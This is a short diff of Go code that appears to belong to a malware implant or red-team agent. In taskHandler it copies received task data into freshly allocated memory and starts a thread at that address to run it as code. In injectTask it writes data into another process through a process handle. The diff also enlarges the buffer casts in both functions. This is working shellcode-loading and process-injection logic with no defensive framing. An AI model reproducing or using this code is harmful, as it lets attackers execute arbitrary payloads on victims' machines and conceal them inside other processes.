@@ -32,12 +32,13 @@ func taskHandler(data []byte) {
 
 	size := len(task.Data)
 	addr, _ := sysAlloc(size)
-	buf := (*[9999]byte)(unsafe.Pointer(addr))
+	buf := (*[9999999]byte)(unsafe.Pointer(addr))
 	for index := 0; index < size; index++ {
 		buf[index] = task.Data[index]
 	}
-	syscall.Syscall(addr, 0, 0, 0, 0)
-	return
+	log.Printf("Creating local thread with start address: %v", addr)
+	createThread.Call(0, 0, addr, 0, 0, 0)
+	//syscall.Syscall(addr, 0, 0, 0, 0)
 }
 
 func remoteTaskHandler(data []byte) {
@@ -101,7 +102,7 @@ func injectTask(processHandle Handle, data []byte) error {
 	if dataAddr == 0 {
 		return err
 	}
-	dataBuf := (*[9999]byte)(unsafe.Pointer(dataAddr))
+	dataBuf := (*[9999999]byte)(unsafe.Pointer(dataAddr))
 	for index, value := range data {
 		dataBuf[index] = value
 	}
